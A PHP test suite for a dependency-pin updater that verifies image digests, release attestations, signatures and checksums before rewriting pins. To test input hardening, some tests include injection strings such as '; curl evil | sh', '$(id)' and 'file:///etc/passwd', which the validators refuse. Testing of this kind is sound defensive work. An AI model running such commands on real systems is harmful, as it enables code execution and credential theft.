<?php

declare(strict_types=1);

/**
 * `tinvar deps:check` (ADR 0079) without the network: how it reads the
 * pins, picks what each may move to, refuses what it cannot verify, and
 * rewrites -- against a fixture checkout and fixture upstreams.
 */

namespace Tinvar\Tests\Deps;

use Tinvar\Deps\CurlHttp;
use Tinvar\Deps\DepsCommand;
use Tinvar\Deps\DepsException;
use Tinvar\Deps\Outcome;
use Tinvar\Deps\PinnedFiles;
use Tinvar\Deps\Pins\AnchorePin;
use Tinvar\Deps\Pins\ComposerPin;
use Tinvar\Deps\Pins\FrankenPhpPin;
use Tinvar\Deps\Pins\GhPin;
use Tinvar\Deps\Pins\ImagePin;
use Tinvar\Deps\Pins\NodePin;
use Tinvar\Deps\Pins\PeclPin;
use Tinvar\Deps\Pins\WatchedPin;
use Tinvar\Deps\Version;

require_once __DIR__ . '/Upstream.php';

const PHP_DIGEST = '635a4b998025ab269194639a5549c6fdcd9b4f88ec8cd761b092de8653d40663';

describe('versions', function () {
    it('reads three numbers and nothing else', function () {
        expect((string) Version::parse('8.5.12'))->toBe('8.5.12')
            ->and((string) Version::parse('v1.13.4', v: true))->toBe('1.13.4');

        foreach (['v1.2.3', '1.2', '1.2.3.4', '01.2.3', '1.02.3', '1.2.3-rc1', "1.2.3\n", '1.2.3 ', ' 1.2.3', '1.2.3;id', '1.2.$(id)', '', '1234567.0.0'] as $text) {
            expect(Version::tryParse($text))->toBeNull();
        }
        expect(Version::tryParse('1.2.3', v: true))->toBeNull();
    });

    it('compares by number, not by text', function () {
        expect(Version::parse('8.5.10')->newerThan(Version::parse('8.5.9')))->toBeTrue()
            ->and((string) Version::newest(['8.5.9', '8.5.10', 'junk', '8.6.0'], eligible: static fn (Version $v): bool => $v->minor() === '8.5'))->toBe('8.5.10');
    });

    it('quotes untrusted text so it prints as one line of ASCII', function () {
        expect(Version::quote("a'b\nc\x1b[31m"))->toBe("'a\\x27b\\x0ac\\x1b[31m'");
    });
});

describe('the pinned files', function () {
    it('finds each pin as many times as it is written, and every copy agreeing', function () {
        $files = files();

        expect($files->agreed(null, '/php:8\.5-cli@sha256:([0-9a-f]{64})/', 1, null))->toBe([PHP_DIGEST])
            ->and(fn () => $files->find(PinnedFiles::SETUP, '/^NODE_SHA256=/m'))->toThrow(DepsException::class, 'matched 0 times');

        $disagreeing = new PinnedFiles(['a' => "x=1\n", 'b' => "x=2\n"]);
        expect(fn () => $disagreeing->agreed(null, '/^x=([0-9])$/m', 1, null))->toThrow(DepsException::class, 'more than one way: 1 / 2');
    });

    // The skeleton's image and build stage copy the shop's pins (ADR 0082):
    // a pin is read from the original, held to agree with the copy where the
    // copy has it, and moved in both. One the copy lacks -- APCu -- is the
    // original's alone.
    it('holds the skeleton\'s copies to the originals, and moves both', function () {
        $files = new PinnedFiles([
            PinnedFiles::SETUP => "COMPOSER_VERSION=2.10.3\nAPCU_VERSION=5.1.28\n",
            PinnedFiles::SKELETON_SETUP => "COMPOSER_VERSION=2.10.3\n",
        ]);
        $files->replace(PinnedFiles::SETUP, '/^COMPOSER_VERSION=([0-9.]+)$/m', ['2.10.4']);
        $files->replace(PinnedFiles::SETUP, '/^APCU_VERSION=([0-9.]+)$/m', ['5.1.29']);

        expect($files->changed())->toBe([
            PinnedFiles::SETUP => "COMPOSER_VERSION=2.10.4\nAPCU_VERSION=5.1.29\n",
            PinnedFiles::SKELETON_SETUP => "COMPOSER_VERSION=2.10.4\n",
        ]);

        $drifted = new PinnedFiles([
            PinnedFiles::SETUP => "COMPOSER_VERSION=2.10.3\n",
            PinnedFiles::SKELETON_SETUP => "COMPOSER_VERSION=2.10.1\n",
        ]);
        expect(fn () => $drifted->agreed(PinnedFiles::SETUP, '/^COMPOSER_VERSION=([0-9.]+)$/m'))
            ->toThrow(DepsException::class, 'more than one way: 2.10.3 / 2.10.1');
    });

    it('writes only a short run of plain characters into a pin', function () {
        $files = new PinnedFiles(['setup' => "COMPOSER_VERSION=2.10.3\n"]);
        foreach (['2.10.4; curl evil | sh', "2.10.4\nEVIL=1", '$(id)', '`id`', '', str_repeat('1', 129)] as $value) {
            expect(fn () => $files->replace('setup', '/^COMPOSER_VERSION=([0-9.]+)$/m', [$value]))->toThrow(DepsException::class, 'Refusing to write');
        }
        expect($files->changed())->toBe([]);

        $files->replace('setup', '/^COMPOSER_VERSION=([0-9.]+)$/m', ['2.10.4']);
        expect($files->changed())->toBe(['setup' => "COMPOSER_VERSION=2.10.4\n"]);
    });

    it('rewrites every match and every group, back to front', function () {
        $files = new PinnedFiles(['f' => "a 1 b 22\na 333 b 4\n"]);
        $files->replace('f', '/^a ([0-9]+) b ([0-9]+)$/m', ['5', '66666'], 2, 2);

        expect($files->contents('f'))->toBe("a 5 b 66666\na 5 b 66666\n");
    });
});

describe('an image', function () {
    it('moves to the newest tag on its line, every copy and every tag comment', function () {
        $http = new FakeHttp();
        $digest = image($http, 'php', '-cli-trixie', '8.5.13-cli-trixie', [
            '8.5.12-cli-trixie' => 'sha256:' . PHP_DIGEST,
            '8.5.9-cli-trixie' => null,
            '8.6.0-cli-trixie' => 'sha256:' . str_repeat('6', 64),
            '8.5.14rc1-cli-trixie' => null,
            '8.5.99-cli-bookworm' => null,
        ], ['PHP_VERSION' => '8.5.13']);
        $files = files();

        $outcome = ImagePin::php()->check($files, context($http));

        expect($outcome->status)->toBe('bumped')
            ->and($outcome->to)->toBe('8.5.13-cli-trixie @' . substr($digest, 0, 19));
        $hex = substr($digest, 7);
        expect(substr_count($files->contents(PinnedFiles::DOCKERFILE), "php:8.5-cli@sha256:{$hex} AS"))->toBe(2)
            ->and(substr_count($files->contents('.github/workflows/ci.yml'), "php:8.5-cli@sha256:{$hex} # 8.5.13-cli-trixie\n"))->toBe(2)
            ->and($files->contents('.github/workflows/ci.yml'))->not->toContain(PHP_DIGEST)
            ->and(substr_count($files->contents(PinnedFiles::SKELETON_DOCKERFILE), "php:8.5-cli@sha256:{$hex} AS"))->toBe(2)
            ->and(array_keys($files->changed()))->toBe(['.github/workflows/ci.yml', 'examples/shop/Dockerfile', 'packages/skeleton/Dockerfile'])
            ->and(implode(' ', $outcome->notes))->toContain('PHP_VERSION=8.5.13');

        // The registry is read with its token, Hub's API with none.
        foreach ($http->requests as [$url, $headers]) {
            expect(isset($headers['Authorization']))->toBe(str_starts_with($url, 'https://registry-1.docker.io/'));
        }
    });

    it('is current when the newest tag is still the pinned digest', function () {
        $http = new FakeHttp();
        $digest = image($http, 'postgres', '17.', '17.11');
        $files = files();
        // The fixture's digest is not this fixture index's, so pin it first.
        $files->replace(null, '/postgres:17@sha256:([0-9a-f]{64})/', [substr($digest, 7)], 1, null);
        $before = $files->contents('.github/workflows/ci.yml');

        $outcome = ImagePin::postgres()->check($files, context($http));

        expect($outcome->status)->toBe('current')
            ->and($files->contents('.github/workflows/ci.yml'))->toBe($before);
    });

    it('takes a rebuild of the same version under a new digest', function () {
        $http = new FakeHttp();
        image($http, 'mysql', '8.4.', '8.4.13', ['8.4.12' => null, '9.0.1' => null]);
        $files = files();

        $outcome = ImagePin::mysql()->check($files, context($http));

        expect($outcome->status)->toBe('bumped')
            ->and(implode(' ', $outcome->notes))->toContain('rebuilt upstream')
            ->and($files->contents('.github/workflows/ci.yml'))->toContain(' # 8.4.13');
    });

    it('moves Redis to the newest patch on its line', function () {
        $http = new FakeHttp();
        $digest = image($http, 'redis', '8.10.', '8.10.4', ['8.10.3' => null, '8.12.0' => null]);
        $files = files();

        $outcome = ImagePin::redis()->check($files, context($http));

        expect($outcome->status)->toBe('bumped')
            ->and($files->contents('.github/workflows/ci.yml'))->toContain('redis:8.10@' . $digest . ' # 8.10.4');
    });

    it('refuses a manifest that does not hash to the digest the registry gave', function () {
        $http = new FakeHttp();
        image($http, 'debian', 'trixie-slim', 'trixie-slim', registryDigest: 'sha256:' . str_repeat('b', 64));

        expect(fn () => ImagePin::debian()->check(files(), context($http)))
            ->toThrow(DepsException::class, 'does not hash to the digest the registry gave');
    });

    it('refuses when Hub and the registry name two digests', function () {
        $http = new FakeHttp();
        image($http, 'debian', 'trixie-slim', 'trixie-slim', hubDigest: 'sha256:' . str_repeat('c', 64));

        expect(fn () => ImagePin::debian()->check(files(), context($http)))
            ->toThrow(DepsException::class, 'Docker Hub lists library/debian:trixie-slim as');
    });

    it('refuses a php image whose PHP is not its tag', function () {
        $http = new FakeHttp();
        image($http, 'php', '-cli-trixie', '8.5.13-cli-trixie', environment: ['PHP_VERSION' => '8.5.12']);

        expect(fn () => ImagePin::php()->check(files(), context($http)))
            ->toThrow(DepsException::class, "sets PHP_VERSION='8.5.12', not its tag's version");
    });

    it('refuses copies of one image on two digests', function () {
        $files = files();
        $files->replace(PinnedFiles::DOCKERFILE, '/^FROM php:8\.5-cli@sha256:([0-9a-f]{64}) AS php$/m', [str_repeat('d', 64)]);

        expect(fn () => ImagePin::php()->check($files, context(new FakeHttp())))
            ->toThrow(DepsException::class, 'php:8.5-cli is pinned more than one way');
    });
});

describe('FrankenPHP', function () {

    it('moves to a release whose binaries are attested and carry the image\'s PHP minor', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        $assets = frankenphpRelease($http, $verifier, '1.13.4', '8.5.13');
        $files = files();

        $outcome = new FrankenPhpPin()->check($files, context($http, $verifier));

        expect($outcome->status)->toBe('bumped')
            ->and($outcome->from)->toBe('v1.13.3 (PHP 8.5.12)')
            ->and($outcome->to)->toBe('v1.13.4 (PHP 8.5.13)');
        $dockerfile = $files->contents(PinnedFiles::DOCKERFILE);
        expect($dockerfile)->toContain('"https://github.com/php/frankenphp/releases/download/v1.13.4/$frankenphp"')
            ->and($dockerfile)->toContain("FrankenPHP's official static binary, v1.13.4 with PHP 8.5.13,")
            ->and($dockerfile)->toContain('frankenphp_sha256=' . hash('sha256', $assets['frankenphp-linux-aarch64-gnu']) . ';')
            ->and($dockerfile)->toContain('frankenphp_sha256=' . hash('sha256', $assets['frankenphp-linux-x86_64-gnu']) . ';')
            // tini is not FrankenPHP's to move.
            ->and($dockerfile)->toContain('/tini/releases/download/v0.19.0/');

        // The skeleton's image moves with the shop's (ADR 0082).
        $skeleton = $files->contents(PinnedFiles::SKELETON_DOCKERFILE);
        expect($skeleton)->toContain('"https://github.com/php/frankenphp/releases/download/v1.13.4/$frankenphp"')
            ->and($skeleton)->toContain("FrankenPHP's official static binary, v1.13.4 with PHP 8.5.13,")
            ->and($skeleton)->toContain('frankenphp_sha256=' . hash('sha256', $assets['frankenphp-linux-x86_64-gnu']) . ';');
    });

    it('holds a release built on another PHP minor, and writes nothing', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        frankenphpRelease($http, $verifier, '1.14.1', '8.6.0');
        $files = files();

        $outcome = new FrankenPhpPin()->check($files, context($http, $verifier));

        expect($outcome->status)->toBe('held')
            ->and($outcome->notes[0])->toContain('PHP 8.6.0, and the php image is 8.5')
            ->and($files->changed())->toBe([]);
    });

    it('refuses a binary with no attestation', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        frankenphpRelease($http, $verifier, '1.13.4', '8.5.12', attested: false);

        expect(fn () => new FrankenPhpPin()->check(files(), context($http, $verifier)))
            ->toThrow(DepsException::class, 'No attestation');
    });

    it('refuses a binary that does not hash to the digest GitHub recorded', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        frankenphpRelease($http, $verifier, '1.13.4', '8.5.12');
        $http->on('https://github.com/php/frankenphp/releases/download/v1.13.4/frankenphp-linux-aarch64-gnu', frankenphp('1.13.4', '8.5.12', 'other'));

        expect(fn () => new FrankenPhpPin()->check(files(), context($http, $verifier)))
            ->toThrow(DepsException::class, 'not the');
    });

    it('refuses a binary whose banner names another release', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        frankenphpRelease($http, $verifier, '1.13.4', '8.5.12', digests: false);
        $bytes = frankenphp('1.13.2', '8.5.12', 'x86_64');
        $verifier->attested[hash('sha256', $bytes)] = FrankenPhpPin::REPOSITORY . ' ' . FrankenPhpPin::WORKFLOW;
        $http->on('https://github.com/php/frankenphp/releases/download/v1.13.4/frankenphp-linux-x86_64-gnu', $bytes);

        expect(fn () => new FrankenPhpPin()->check(files(), context($http, $verifier)))
            ->toThrow(DepsException::class, 'says it is FrankenPHP v1.13.2');
    });

    it('is current while the release and its sums are the pinned ones, downloading nothing', function () {
        $http = new FakeHttp();
        $http->json('https://api.github.com/repos/php/frankenphp/releases?per_page=50', [[
            'tag_name' => 'v1.13.3', 'draft' => false, 'prerelease' => false, 'assets' => [
                ['name' => 'frankenphp-linux-aarch64-gnu', 'digest' => 'sha256:53aca1dfd4496cd1cb1d1954d0e9a5896e60c65dc7a61ebd7a821c69bdcea539'],
                ['name' => 'frankenphp-linux-x86_64-gnu', 'digest' => 'sha256:d210c06bfcd7ed974c05376fc7fa9c300b1db8cd2a7c793bed5ed8d087b3f0ef'],
            ],
        ]]);

        $outcome = new FrankenPhpPin()->check(files(), context($http));

        expect($outcome->status)->toBe('current')
            ->and($http->urls())->toBe(['https://api.github.com/repos/php/frankenphp/releases?per_page=50'])
            // GitHub's token goes to its API.
            ->and($http->requests[0][1]['Authorization'] ?? null)->toBe('Bearer test-token');
    });

    it('reads the banner across a chunk boundary, and refuses two', function () {
        $path = sys_get_temp_dir() . '/tinvar-banner-' . bin2hex(random_bytes(4));
        file_put_contents($path, str_repeat("\0", (1 << 20) - 20) . 'FrankenPHP v1.13.4 PHP 8.5.12 Caddy' . str_repeat("\0", 50));
        [$version, $php] = FrankenPhpPin::banner($path);
        expect((string) $version)->toBe('1.13.4')->and((string) $php)->toBe('8.5.12');

        file_put_contents($path, 'FrankenPHP v1.13.4 PHP 8.5.12 Caddy / FrankenPHP v1.13.4 PHP 8.6.0 Caddy');
        expect(fn () => FrankenPhpPin::banner($path))->toThrow(DepsException::class, 'carries 2 FrankenPHP version banners');
        unlink($path);
    });
});

describe('Node', function () {

    it('moves to its LTS line\'s newest release, its sums held to the signed list', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        $keys = nodeRelease($http, $verifier, '22.24.0');
        $files = files();

        $outcome = new NodePin($keys)->check($files, context($http, $verifier));

        expect($outcome->status)->toBe('bumped')
            ->and($outcome->to)->toBe('22.24.0');
        $setup = $files->contents(PinnedFiles::SETUP);
        expect($setup)->toContain("NODE_VERSION=22.24.0\n")
            ->and($setup)->toContain("NODE_ARCH=x64\n        NODE_SHA256=" . hash('sha256', 'tarball node-v22.24.0-linux-x64.tar.xz') . "\n")
            ->and($setup)->toContain("NODE_ARCH=arm64\n        NODE_SHA256=" . hash('sha256', 'tarball node-v22.24.0-linux-arm64.tar.xz') . "\n")
            ->and(implode(' ', $outcome->notes))->toContain('Node 24 is LTS too');
    });

    it('refuses a release whose sums are not signed', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        $keys = nodeRelease($http, $verifier, '22.24.0', signed: false);

        expect(fn () => new NodePin($keys)->check(files(), context($http, $verifier)))->toThrow(DepsException::class, 'does not hold');
    });

    it('refuses a keyring that is not the pinned one', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        nodeRelease($http, $verifier, '22.24.0');

        expect(fn () => new NodePin()->check(files(), context($http, $verifier)))->toThrow(DepsException::class, 'is not the one pinned');
    });

    it('refuses a tarball the signed list does not vouch for', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        $keys = nodeRelease($http, $verifier, '22.24.0', tamper: 'linux-arm64');

        expect(fn () => new NodePin($keys)->check(files(), context($http, $verifier)))->toThrow(DepsException::class, 'its signed SHASUMS256.txt gives');
    });

    it('reads a sums list strictly', function () {
        expect(NodePin::shasums(str_repeat('a', 64) . "  node.tar.xz\n"))->toBe(['node.tar.xz' => str_repeat('a', 64)])
            ->and(fn () => NodePin::shasums(str_repeat('a', 64) . " node.tar.xz\n"))->toThrow(DepsException::class)
            ->and(fn () => NodePin::shasums(str_repeat('a', 64) . "  a\n" . str_repeat('b', 64) . "  a\n"))->toThrow(DepsException::class, 'twice');
    });
});

describe('Composer', function () {
    it('moves on its major to a phar matching its sum and signed by the release key', function () {
        $key = openssl_pkey_new(['private_key_bits' => 2048, 'private_key_type' => OPENSSL_KEYTYPE_RSA]);
        expect($key)->not->toBeFalse();
        $public = (string) (openssl_pkey_get_details($key)['key'] ?? '');
        $phar = 'composer 2.10.4';
        openssl_sign($phar, $signature, $key, OPENSSL_ALGO_SHA384);
        $http = (new FakeHttp())
            ->json('https://getcomposer.org/versions', ['stable' => [
                ['version' => '2.10.4', 'min-php' => 70205],
                ['version' => '2.2.31', 'min-php' => 50300],
                ['version' => '3.0.0', 'min-php' => 80100],
                ['version' => '2.99.0', 'min-php' => 999999],
            ]])
            ->on('https://getcomposer.org/download/2.10.4/composer.phar', $phar)
            ->on('https://getcomposer.org/download/2.10.4/composer.phar.sha256sum', hash('sha256', $phar) . "  composer.phar\n")
            ->json('https://getcomposer.org/download/2.10.4/composer.phar.sig', ['sha384' => base64_encode((string) $signature)]);
        $files = files();

        $outcome = new ComposerPin($public)->check($files, context($http));

        expect($outcome->status)->toBe('bumped')
            ->and($files->contents(PinnedFiles::SETUP))->toContain("COMPOSER_VERSION=2.10.4\nCOMPOSER_SHA256=" . hash('sha256', $phar) . "\n");

        // Composer's real key did not sign it.
        expect(fn () => new ComposerPin()->check(files(), context($http)))->toThrow(DepsException::class, "not signed by Composer's release key");
    });
});

describe('APCu', function () {
    it('moves to PECL\'s newest stable release, published on GitHub too', function () {
        $tarball = (string) gzencode("package.xml\0<version>\n  <release>5.1.29</release>\n</version>");
        $http = (new FakeHttp())
            ->on('https://pecl.php.net/rest/r/apcu/stable.txt', "5.1.29\n")
            ->on('https://pecl.php.net/get/apcu-5.1.29.tgz', $tarball);
        releases($http, 'krakjoe/apcu', ['v5.1.29' => []]);
        $files = files();

        $outcome = PeclPin::apcu()->check($files, context($http));

        expect($outcome->status)->toBe('bumped')
            ->and($files->contents(PinnedFiles::SETUP))->toContain("APCU_VERSION=5.1.29\nAPCU_SHA256=" . hash('sha256', $tarball) . "\n");
    });

    it('refuses a release GitHub does not have, and holds a new major', function () {
        $http = (new FakeHttp())->on('https://pecl.php.net/rest/r/apcu/stable.txt', "5.1.29\n");
        releases($http, 'krakjoe/apcu', ['v5.1.28' => []]);
        expect(fn () => PeclPin::apcu()->check(files(), context($http)))->toThrow(DepsException::class, 'has no release in krakjoe/apcu');

        $http->on('https://pecl.php.net/rest/r/apcu/stable.txt', '6.0.0');
        expect(PeclPin::apcu()->check(files(), context($http))->status)->toBe('held');
    });

    it('refuses a version PECL gives that is not one', function () {
        $http = (new FakeHttp())->on('https://pecl.php.net/rest/r/apcu/stable.txt', "5.1.29\nAPCU_SHA256=0");

        expect(fn () => PeclPin::apcu()->check(files(), context($http)))->toThrow(DepsException::class, 'Not a version');
    });
});

describe('phpredis', function () {
    it('moves to PECL\'s newest stable release, published on GitHub too', function () {
        $tarball = (string) gzencode("package.xml\0<version>\n  <release>6.3.1</release>\n</version>");
        $http = (new FakeHttp())
            ->on('https://pecl.php.net/rest/r/redis/stable.txt', "6.3.1\n")
            ->on('https://pecl.php.net/get/redis-6.3.1.tgz', $tarball);
        releases($http, 'phpredis/phpredis', ['6.3.1' => []]);
        $files = files();

        $outcome = PeclPin::phpredis()->check($files, context($http));

        expect($outcome->status)->toBe('bumped')
            ->and($files->contents(PinnedFiles::SETUP))->toContain("PHPREDIS_VERSION=6.3.1\nPHPREDIS_SHA256=" . hash('sha256', $tarball) . "\n")
            ->and($files->contents(PinnedFiles::SETUP))->toContain("APCU_VERSION=5.1.28\n");
    });

    it('refuses a release GitHub does not have', function () {
        $http = (new FakeHttp())->on('https://pecl.php.net/rest/r/redis/stable.txt', "6.3.1\n");
        releases($http, 'phpredis/phpredis', ['6.3.0' => []]);

        expect(fn () => PeclPin::phpredis()->check(files(), context($http)))->toThrow(DepsException::class, 'has no release in phpredis/phpredis');
    });
});

describe('gh and the watched binaries', function () {
    it('moves gh to an attested release on its major', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        $assets = [];
        foreach (GhPin::ARCHES as $arch) {
            $assets["gh_2.104.0_linux_{$arch}.tar.gz"] = "gh {$arch}";
            $verifier->attested[hash('sha256', "gh {$arch}")] = GhPin::REPOSITORY . ' ' . GhPin::WORKFLOW;
        }
        releases($http, GhPin::REPOSITORY, ['v3.0.0' => ['gh_3.0.0_linux_amd64.tar.gz' => 'x', 'gh_3.0.0_linux_arm64.tar.gz' => 'y'], 'v2.104.0' => $assets]);
        $files = files();

        $outcome = new GhPin()->check($files, context($http, $verifier));

        expect($outcome->to)->toBe('2.104.0')
            ->and($files->contents(PinnedFiles::TOOLS))->toContain("GH_VERSION=2.104.0\n")
            ->and($files->contents(PinnedFiles::TOOLS))->toContain("GH_ARCH=arm64\n        GH_SHA256=" . hash('sha256', 'gh arm64') . "\n");
    });

    it('moves Syft to an immutable release whose four archives match its checksums', function () {
        $http = new FakeHttp();
        $verifier = new FakeVerifier();
        $assets = [];
        $checksums = '';
        foreach (AnchorePin::PLATFORMS as $platform) {
            $name = "syft_1.55.0_{$platform}.tar.gz";
            $assets[$name] = "syft {$platform}";
            $checksums .= hash('sha256', $assets[$name]) . "  {$name}\n";
            $verifier->released[hash('sha256', $assets[$name])] = 'anchore/syft v1.55.0';
        }
        $assets['syft_1.55.0_checksums.txt'] = $checksums;
        $verifier->released[hash('sha256', $checksums)] = 'anchore/syft v1.55.0';
        releases($http, 'anchore/syft', ['v2.0.0' => [], 'v1.55.0' => $assets]);
        $files = files();

        $outcome = AnchorePin::syft()->check($files, context($http, $verifier));

        $sbom = $files->contents(PinnedFiles::SBOM);
        expect($outcome->to)->toBe('1.55.0')
            ->and($sbom)->toContain("SYFT_VERSION=1.55.0\n")
            ->and($sbom)->toContain('syft-darwin_arm64) echo ' . hash('sha256', 'syft darwin_arm64') . " ;;\n")
            ->and($sbom)->toContain('syft-linux_amd64) echo ' . hash('sha256', 'syft linux_amd64') . " ;;\n")
            // Grype's are its own.
            ->and($sbom)->toContain("GRYPE_VERSION=0.120.1\n");

        // An archive the release attestation does not name is refused.
        unset($verifier->released[hash('sha256', 'syft linux_arm64')]);
        expect(fn () => AnchorePin::syft()->check(files(), context($http, $verifier)))->toThrow(DepsException::class, 'release attestation does not name');
    });

    it('holds tini and splitsh-lite for a reviewer, and moves neither', function () {
        $http = new FakeHttp();
        releases($http, 'krallin/tini', ['v0.20.0' => ['tini-static-amd64' => 'a', 'tini-static-arm64' => 'b']]);
        // A newer splitsh-lite with no Linux build is no candidate.
        releases($http, 'splitsh/lite', ['v2.0.0' => [], 'v1.0.1' => ['lite_linux_amd64.tar.gz' => 'c']]);
        $files = files();

        expect(WatchedPin::tini()->check($files, context($http))->status)->toBe('held')
            ->and(WatchedPin::splitsh()->check($files, context($http))->status)->toBe('current')
            ->and($files->changed())->toBe([]);
    });
});

describe('the command', function () {

    it('writes nothing in a dry run, and says what it would move', function () {
        [$http, $verifier] = upstreams();
        $root = checkout();
        $before = file_get_contents("{$root}/examples/shop/Dockerfile");
        $command = new DepsCommand($root, $http, $verifier, [ImagePin::php(), ImagePin::debian(), new FrankenPhpPin(), new ComposerPin()]);

        ob_start();
        $result = $command->run(['--dry-run']);
        $out = (string) ob_get_clean();

        expect($result)->toBe(['status' => 1, 'wrote' => false])
            ->and(file_get_contents("{$root}/examples/shop/Dockerfile"))->toBe($before)
            ->and($out)->toContain('Dry run: would write')
            ->and(array_map(static fn (Outcome $o): string => "{$o->pin} {$o->status}", $command->outcomes()))
            ->toBe(['php-image bumped', 'debian-image bumped', 'frankenphp bumped', 'composer failed']);
        discard($root);
    });

    it('writes what verified, leaves what failed, and summarises both', function () {
        [$http, $verifier] = upstreams();
        $root = checkout();
        $setup = file_get_contents("{$root}/.github/ci/setup");
        $summary = "{$root}/summary.md";
        $command = new DepsCommand($root, $http, $verifier, [new FrankenPhpPin(), new ComposerPin()]);

        ob_start();
        $result = $command->run(['--write', "--summary={$summary}"]);
        ob_end_clean();

        expect($result)->toBe(['status' => 1, 'wrote' => true])
            ->and(file_get_contents("{$root}/examples/shop/Dockerfile"))->toContain('/releases/download/v1.13.4/$frankenphp')
            ->and(file_get_contents("{$root}/.github/ci/setup"))->toBe($setup);
        $markdown = (string) file_get_contents($summary);
        expect($markdown)->toContain('| frankenphp | v1.13.3 &#40;PHP 8.5.12&#41; | v1.13.4 &#40;PHP 8.5.12&#41; |')
            ->and($markdown)->toContain('## Could not be checked')
            ->and($markdown)->not->toContain('](');
        discard($root);
    });

    it('checks only what --only names, and refuses a name it does not know', function () {
        [$http, $verifier] = upstreams();
        $command = new DepsCommand(FIXTURES, $http, $verifier);

        ob_start();
        $result = $command->run(['--only=debian-image']);
        ob_end_clean();
        expect($result['status'])->toBe(0)
            ->and(array_map(static fn (Outcome $o): string => $o->pin, $command->outcomes()))->toBe(['debian-image']);

        expect(new DepsCommand(FIXTURES, $http, $verifier)->run(['--only=nope', '--write'])['status'] ?? null)->toBe(2);
    });

    it('reads every pin in the repository\'s own files', function () {
        // Offline, every pin gets as far as its first request: each one's
        // patterns found what they look for, as often as they expect.
        $command = new DepsCommand(\dirname(__DIR__, 4), new FakeHttp(), new FakeVerifier());

        ob_start();
        $command->run([]);
        ob_end_clean();

        expect(\count($command->outcomes()))->toBe(\count(DepsCommand::pins()));
        foreach ($command->outcomes() as $outcome) {
            expect($outcome->status)->toBe('failed')
                ->and($outcome->notes[0])->toStartWith('offline: https://');
        }
    });
});

describe('HTTPS', function () {
    it('takes https:// URLs on port 443 with no user, and nothing else', function () {
        expect(CurlHttp::host('https://Registry-1.docker.io/v2/'))->toBe('registry-1.docker.io')
            ->and(CurlHttp::resolve('https://github.com/a', '/b?c'))->toBe('https://github.com/b?c')
            ->and(CurlHttp::resolve('https://github.com/a', 'https://objects.githubusercontent.com/x'))->toBe('https://objects.githubusercontent.com/x');

        foreach (['http://github.com/', 'ftp://github.com/', 'https://user@github.com/', 'https://github.com:8443/', 'file:///etc/passwd', 'https:///x', "https://github.com/a\nb", 'https://github.com/a b', '//evil.example/x'] as $url) {
            expect(fn () => CurlHttp::host($url))->toThrow(DepsException::class, 'Not an https:// URL');
        }
        expect(fn () => CurlHttp::resolve('https://github.com/a', 'http://evil.example/'))->toThrow(DepsException::class);
    });
});

describe('the weekly workflow', function () {
    it('lets its proposal touch every file the pins are written in, and nothing else', function () {
        // The propose job refuses a patch touching a path its case does not
        // name: a pinned file left out of it fails every week a pin there moves.
        $root = \dirname(__DIR__, 4);
        $workflow = (string) file_get_contents("{$root}/.github/workflows/deps.yml");
        expect(preg_match('/^ *case "\$path" in\n(.*?)^ *esac$/ms', $workflow, $case))->toBe(1);
        expect(preg_match_all('/^ *([^\n()]+?)\) ;;$/m', $case[1], $arms))->toBeGreaterThan(0);
        $allowed = array_map('trim', explode('|', implode('|', $arms[1])));

        foreach (PinnedFiles::load($root)->paths() as $path) {
            $matched = array_filter($allowed, static fn (string $pattern): bool => fnmatch($pattern, $path));
            expect($matched)->not->toBe([], "{$path} is a pinned file the proposal would refuse");
        }
        expect(array_filter($allowed, static fn (string $pattern): bool => !str_contains($pattern, '*') && !is_file("{$root}/{$pattern}")))->toBe([]);
    });
});
